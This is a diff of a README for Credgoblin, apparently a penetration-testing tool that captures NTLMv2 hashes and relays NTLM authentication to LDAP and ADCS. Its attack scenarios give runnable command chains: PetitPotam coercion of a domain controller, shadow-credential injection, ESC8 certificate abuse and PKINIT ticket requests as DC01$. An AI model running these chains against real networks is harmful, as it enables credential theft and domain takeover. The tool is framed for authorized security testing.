@@ -1,28 +1,49 @@
-# Credgoblin
+<p align="center">
+  <img src="assets/credgoblin-logo.png" alt="Credgoblin Logo" width="350">
+</p>
+
+<h1 align="center">Credgoblin</h1>
 
 <p align="center">
-  <img src="assets/credgoblin-logo.png" alt="Credgoblin Logo" width="400">
+  <strong>NTLM Hash Capture &amp; Relay Tool</strong><br>
+  <em>A Go-based credential interception toolkit for Active Directory security assessments</em>
 </p>
 
 <p align="center">
-  <strong>NTLM Hash Capture & Relay Tool</strong><br>
-  A Go implementation for capturing NTLMv2 hashes and relaying authentication to LDAP and AD CS.
+  <a href="#features">Features</a> •
+  <a href="#installation">Installation</a> •
+  <a href="#usage">Usage</a> •
+  <a href="#attack-scenarios">Attack Scenarios</a> •
+  <a href="#technical-details">Technical Details</a>
 </p>
 
 ---
 
+## Overview
+
+Credgoblin is a high-performance NTLM credential capture and relay tool written in Go. It provides security professionals with the ability to:
+
+- **Capture** NTLMv2 hashes from SMB, HTTP, and HTTPS connections
+- **Relay** NTLM authentication to LDAP for Shadow Credentials attacks
+- **Relay** to AD Certificate Services (ADCS) for ESC8 certificate abuse
+- **Export** credentials in formats compatible with Hashcat and PKINITtools
+
 ## Features
 
-| Feature | Description |
-|---------|-------------|
-| **Hash Capture** | Capture NTLMv2 hashes via SMB (445), HTTP (80), and HTTPS (443) |
-| **LDAP Relay** | Relay authentication to LDAP/LDAPS for shadow credentials attacks |
-| **ADCS Relay** | Relay to AD CS web enrollment for certificate requests (ESC8) |
-| **Shadow Credentials** | Add `msDS-KeyCredentialLink` for PKINIT-based authentication |
-| **Cross-Protocol** | SMB→LDAP and SMB→HTTP relay support |
-| **Multi-Protocol Server** | SMB1/SMB2 and HTTP/HTTPS with NTLM authentication |
+| Category | Feature | Description |
+|----------|---------|-------------|
+| **Capture** | Multi-Protocol Listener | SMB (445), HTTP (80), HTTPS (443) |
+| **Capture** | Hashcat Output | NTLMv2 hashes in `-m 5600` format |
+| **Relay** | LDAP/LDAPS | Shadow Credentials via `msDS-KeyCredentialLink` |
+| **Relay** | ADCS (ESC8) | Certificate enrollment via web interface |
+| **Relay** | Cross-Protocol | SMB→LDAP, SMB→HTTP, HTTP→LDAP |
+| **Protocol** | SMB Support | SMB1 and SMB2 negotiation |
+| **Protocol** | NTLM Support | Full Type 1/2/3 message handling |
+| **Attack** | CVE-2019-1040 | Drop the MIC implementation |
 
 ## Installation
+
+### From Source
 
 ```bash
 git clone https://github.com/ineffectivecoder/credgoblin.git
@@ -32,66 +53,63 @@ go build -o credgoblin ./cmd/credgoblin
 
 ### Requirements
 
-- Go 1.21+
-- Root privileges (binding to ports 80, 443, 445)
+- **Go**: 1.21 or higher
+- **Privileges**: Root/Administrator (required for binding to ports 80, 443, 445)
+- **Platform**: Linux, macOS, Windows
 
 ## Usage
 
-### Hash Capture
+### Hash Capture Mode
 
-Capture NTLMv2 hashes from incoming connections. Hashes are saved in Hashcat `-m 5600` format.
+Capture NTLMv2 hashes from incoming connections. Hashes are written in Hashcat `-m 5600` compatible format.
 
 ```bash
-# Listen on all protocols (SMB + HTTP)
+# Listen on all protocols (SMB + HTTP + HTTPS)
 sudo ./credgoblin capture -i 0.0.0.0
 
 # SMB only (port 445)
 sudo ./credgoblin capture -i 0.0.0.0 -p 445
 
-# HTTP/HTTPS only (ports 80, 443)
+# HTTP/HTTPS only
 sudo ./credgoblin capture -i 0.0.0.0 -p 80,443
 
-# Custom output file
-sudo ./credgoblin capture -i 0.0.0.0 -o captured.txt -v
+# Custom output file with verbose logging
+sudo ./credgoblin capture -i 0.0.0.0 -o captured_hashes.txt -v
 ```
 
-**Options:**
-```
--i, --interface    Listen address (default: 0.0.0.0)
--p, --ports        Ports: 80, 443, 445, both, or comma-separated (default: both)
--o, --output       Output file (default: hashes.txt)
--s, --server       Server name to advertise (default: CREDGOBLIN)
--d, --domain       Domain name to advertise (default: WORKGROUP)
--v, --verbose      Verbose output
-```
+**Capture Options:**
 
-### LDAP Relay
+| Flag | Long | Default | Description |
+|------|------|---------|-------------|
+| `-i` | `--interface` | `0.0.0.0` | Listen address |
+| `-p` | `--ports` | `both` | Ports: `80`, `443`, `445`, `both`, or comma-separated |
+| `-o` | `--output` | `hashes.txt` | Output file for captured hashes |
+| `-s` | `--server` | `CREDGOBLIN` | Server name to advertise |
+| `-d` | `--domain` | `WORKGROUP` | Domain name to advertise |
+| `-v` | `--verbose` | `false` | Enable verbose output |
 
-Relay captured NTLM authentication to LDAP for shadow credentials attack.
+### LDAP Relay Mode (Shadow Credentials)
+
+Relay NTLM authentication to LDAP/LDAPS and inject Shadow Credentials for PKINIT-based authentication.
 
 ```bash
 # Relay to LDAP
 sudo ./credgoblin relay -t ldap://dc.domain.local \
     -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'
 
-# Relay to LDAPS
+# Relay to LDAPS (encrypted)
 sudo ./credgoblin relay -t ldaps://dc.domain.local \
-    -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'
+    -u 'CN=TargetComputer,CN=Computers,DC=domain,DC=local'
 
-# Custom PFX output
+# Custom PFX output with password
 sudo ./credgoblin relay -t ldap://dc.domain.local \
-    -u 'CN=TargetUser,CN=Users,DC=domain,DC=local' \
-    -o target.pfx -P 'MyPassword'
+    -u 'CN=Administrator,CN=Users,DC=domain,DC=local' \
+    -o admin.pfx -P 'SecurePassword123'
 ```
 
-On success, a PFX file is generated for PKINIT authentication:
-```bash
-python gettgtpkinit.py -cert-pfx target.pfx -pfx-pass '<password>' domain.local/TargetUser
-```
+### ADCS Relay Mode (ESC8)
 
-### ADCS Relay
-
-Relay to AD Certificate Services web enrollment (ESC8 attack).
+Relay to Active Directory Certificate Services web enrollment for certificate-based attacks.
 
 ```bash
 # Relay to ADCS HTTP
@@ -104,123 +122,158 @@ sudo ./credgoblin relay -m adcs \
     -t https://ca.domain.local/certsrv \
     -T Machine
 
-# Listen on HTTP only (port 80)
+# HTTP listener only
 sudo ./credgoblin relay -m adcs \
     -t http://ca.domain.local/certsrv \
     -T User -p 80
 ```
 
-**Options:**
-```
--t, --target       Target URL (ldap://, ldaps://, http://, https://)
--m, --mode         Relay mode: ldap or adcs (default: ldap)
--u, --target-user  Target user DN (required for LDAP mode)
--T, --template     Certificate template (required for ADCS mode)
--o, --output       Output PFX path (default: <username>.pfx)
--P, --pfx-pass     PFX password (random if not set)
--p, --ports        Listen ports: 80, 445, or both (default: both)
--v, --verbose      Verbose output
-```
+**Relay Options:**
 
-## Attack Workflows
+| Flag | Long | Default | Description |
+|------|------|---------|-------------|
+| `-t` | `--target` | *required* | Target URL (`ldap://`, `ldaps://`, `http://`, `https://`) |
+| `-m` | `--mode` | `ldap` | Relay mode: `ldap` or `adcs` |
+| `-u` | `--target-user` | *required for LDAP* | Target user/computer DN |
+| `-T` | `--template` | *required for ADCS* | Certificate template name |
+| `-o` | `--output` | `<username>.pfx` | Output PFX path |
+| `-P` | `--pfx-pass` | *random* | PFX password |
+| `-p` | `--ports` | `both` | Listen ports: `80`, `445`, or `both` |
+| `-v` | `--verbose` | `false` | Enable verbose output |
 
-### Shadow Credentials via Coercion
+## Attack Scenarios
+
+### Scenario 1: Shadow Credentials via Authentication Coercion
+
+Leverage authentication coercion (e.g., PetitPotam) to relay credentials and inject Shadow Credentials.
 
 ```bash
-# Terminal 1: Start relay
-sudo ./credgoblin relay -t ldap://dc.domain.local \
-    -u 'CN=Administrator,CN=Users,DC=domain,DC=local'
+# Terminal 1: Start relay server
+sudo ./credgoblin relay -t ldap://dc.corp.local \
+    -u 'CN=DC01,CN=Computers,DC=corp,DC=local'
 
-# Terminal 2: Coerce authentication
-python PetitPotam.py <attacker-ip> <target-server>
+# Terminal 2: Coerce authentication from target
+python3 PetitPotam.py 10.10.10.50 10.10.10.10
 
-# Terminal 1: Use resulting PFX
-python gettgtpkinit.py -cert-pfx Administrator.pfx \
-    -pfx-pass '<pass>' domain.local/Administrator
+# Terminal 1: Use the resulting PFX for authentication
+python3 gettgtpkinit.py -cert-pfx DC01.pfx \
+    -pfx-pass 'GeneratedPassword' corp.local/DC01$
 ```
 
-### ESC8 - ADCS HTTP Relay
+### Scenario 2: ESC8 - ADCS HTTP Relay
+
+Abuse misconfigured ADCS web enrollment to obtain certificates.
 
 ```bash
 # Terminal 1: Start ADCS relay
 sudo ./credgoblin relay -m adcs \
-    -t http://ca.domain.local/certsrv -T User
+    -t http://ca.corp.local/certsrv -T User
 
-# Terminal 2: Coerce DC authentication
-python PetitPotam.py <attacker-ip> <dc-ip>
+# Terminal 2: Coerce domain controller authentication
+python3 PetitPotam.py 10.10.10.50 10.10.10.10
 
-# Terminal 1: Use DC certificate
-python gettgtpkinit.py -cert-pfx DC01_.pfx \
-    -pfx-pass '<pass>' domain.local/DC01$
+# Terminal 1: Use DC certificate for authentication
+python3 gettgtpkinit.py -cert-pfx DC01_.pfx \
+    -pfx-pass 'GeneratedPassword' corp.local/DC01$
 ```
 
-### WebDAV Hash Capture
+### Scenario 3: WebDAV Hash Capture
+
+Capture credentials via WebClient service coercion.
 
 ```bash
-# Start HTTPS listener (required for WebClient)
+# Start HTTPS listener (WebClient requires HTTPS or localhost)
 sudo ./credgoblin capture -i 0.0.0.0 -p 443
 
 # Coerce WebDAV authentication
-python PetitPotam.py <attacker-ip>@80/test <target>
+python3 PetitPotam.py 10.10.10.50@80/test 10.10.10.10
 ```
 
 ## Technical Details
 
-### Relay Flow
+### NTLM Relay Flow
 
 ```
-Victim              Credgoblin              Target
-   │                    │                     │
-   │── NEGOTIATE ──────>│                     │
-   │<── Challenge ──────│                     │
-   │── Type 1 ─────────>│── Type 1 ──────────>│
-   │                    │<── Type 2 ──────────│
-   │<── Type 2 ─────────│                     │
-   │── Type 3 ─────────>│── Type 3 ──────────>│
-   │                    │<── Success ─────────│
-   │                    │── Attack ──────────>│
+ Victim              Credgoblin              Target
+   │                     │                     │
+   │── SMB Negotiate ───>│                     │
+   │<── SMB Response ────│                     │
+   │── NTLM Type 1 ─────>│── NTLM Type 1 ─────>│
+   │                     │<── NTLM Type 2 ─────│
+   │<── NTLM Type 2 ─────│                     │
+   │── NTLM Type 3 ─────>│── NTLM Type 3 ─────>│
+   │                     │<── Auth Success ────│
+   │                     │── Execute Attack ──>│
+   │<── Auth Response ───│                     │
 ```
 
-### LDAP Authentication
+### LDAP SICILY Authentication
 
-Uses SICILY (Security Integrated Connection over LDAP with Yielding):
-- Discovery bind (tag 9) to enumerate mechanisms
-- Negotiate bind (tag 10) with NTLM Type 1
-- Response bind (tag 11) with NTLM Type 3
+Credgoblin uses SICILY (Security Integrated Connection over LDAP with Yielding) for LDAP relay:
 
-### Shadow Credentials
+1. **Discovery Bind** (Tag 9): Enumerate supported authentication mechanisms
+2. **Negotiate Bind** (Tag 10): Forward NTLM Type 1 message
+3. **Response Bind** (Tag 11): Forward NTLM Type 3 message
 
-Adds `msDS-KeyCredentialLink` attribute containing:
-- RSA 2048-bit public key in BCRYPT_RSAKEY_BLOB format
-- Device ID, timestamps, and key metadata
-- SHA256 key hash for integrity
+### Shadow Credentials Implementation
 
-Generated PFX includes UPN SAN extension for PKINIT compatibility.
+The `msDS-KeyCredentialLink` attribute contains:
 
-### Hash Format
+- **RSA 2048-bit Public Key**: In BCRYPT_RSAKEY_BLOB format
+- **Device ID**: Unique identifier (UUID)
+- **Key ID**: SHA256 hash of the public key
+- **Timestamps**: Creation and last logon times
+- **Key Hash**: SHA256 integrity hash
 
-Captured hashes use Hashcat `-m 5600` format:
+Generated PFX certificates include a UPN (User Principal Name) SAN extension for PKINIT compatibility.
+
+### Hash Output Format
+
+Captured hashes use Hashcat NTLMv2 format (`-m 5600`):
+
 ```
-username::DOMAIN:challenge:NTProofStr:blob
+username::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response
 ```
 
 ## Limitations
 
-- **SMB Signing**: Targets with required SMB signing will reject relay
-- **LDAP Signing**: DCs requiring LDAP signing may block relay
-- **EPA/Channel Binding**: Server 2025 enforces EPA by default, blocking LDAP relay
-- **Certificate Templates**: ADCS relay requires enrollment-enabled templates
+| Limitation | Description |
+|------------|-------------|
+| **SMB Signing** | Targets with required SMB signing will reject relay attacks |
+| **LDAP Signing** | Domain controllers requiring LDAP signing may block relay |
+| **EPA/Channel Binding** | Windows Server 2025 enforces EPA by default, blocking LDAP relay |
+| **Certificate Templates** | ADCS relay requires enrollment-enabled certificate templates |
+
+## Dependencies
+
+- [go-ldap/ldap](https://github.com/go-ldap/ldap) - LDAP client library
+- [Azure/go-ntlmssp](https://github.com/Azure/go-ntlmssp) - NTLM authentication support
+- [google/uuid](https://github.com/google/uuid) - UUID generation
+- [go-pkcs12](https://pkg.go.dev/software.sslmate.com/src/go-pkcs12) - PFX/PKCS#12 export
 
 ## Credits
 
-- [Impacket](https://github.com/fortra/impacket) - ntlmrelayx reference
+Credgoblin draws inspiration and techniques from:
+
+- [Impacket](https://github.com/fortra/impacket) - ntlmrelayx reference implementation
 - [Responder](https://github.com/lgandx/Responder) - Hash capture techniques
-- [PKINITtools](https://github.com/dirkjanm/PKINITtools) - PKINIT authentication
+- [PKINITtools](https://github.com/dirkjanm/PKINITtools) - PKINIT authentication tools
+- [Certipy](https://github.com/ly4k/Certipy) - ADCS attack research
 
 ## License
 
-MIT
+MIT License - See [LICENSE](LICENSE) for details.
 
 ## Disclaimer
 
-For authorized security testing only. Obtain proper authorization before use.
+**This tool is intended for authorized security testing and research purposes only.**
+
+- Obtain proper written authorization before using this tool
+- Ensure compliance with all applicable laws and regulations
+- The authors are not responsible for misuse or damage caused by this tool
+
+---
+
+<p align="center">
+  <em>Built for security professionals, by security professionals.</em>
+</p>
